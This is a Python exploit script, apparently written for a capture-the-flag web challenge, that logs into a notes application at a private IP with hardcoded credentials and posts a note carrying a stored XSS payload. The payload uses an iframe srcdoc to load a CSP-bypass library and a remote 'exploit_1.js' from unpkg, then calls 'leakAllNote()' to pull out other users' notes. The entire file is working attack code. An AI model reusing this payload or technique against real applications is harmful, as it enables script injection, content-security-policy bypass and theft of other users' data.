import requests

def login(session, url, username, password):
    """Logs in to the specified URL using provided credentials."""
    credentials = {'username': username, 'password': password}
    response = session.post(url, data=credentials)
    return response.ok

def create_note(session, url, title, content):
    """Creates a note with the given title and content."""
    note_data = {'title': title, 'content': content}
    response = session.post(url, json=note_data)
    return response.ok

def main():
    # URLs and credentials
    login_url = 'http://10.113.184.121:10082/login'
    create_note_url = 'http://10.113.184.121:10082/api/notes'
    username = 'Robert'
    password = '123456'

    # XSS payload
    xss_payload = """
    <iframe srcdoc="
      <script src='https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js'></script>
      <script src='https://unpkg.com/web_for_ntu/exploit_1.js'></script>
      <br csp= 'leakAllNote()'>
    "></iframe>
    """
    print("XSS Payload Length:", len(xss_payload))

    # Create a session and attempt to log in
    session = requests.session()
    if login(session, login_url, username, password):
        # Attempt to create a note with the XSS payload
        if create_note(session, create_note_url, 'FLAG_AllNote', xss_payload):
            print('Note with XSS payload created successfully')
        else:
            print('Failed to create note with XSS payload')
    else:
        print('Login failed')

if __name__ == '__main__':
    main()
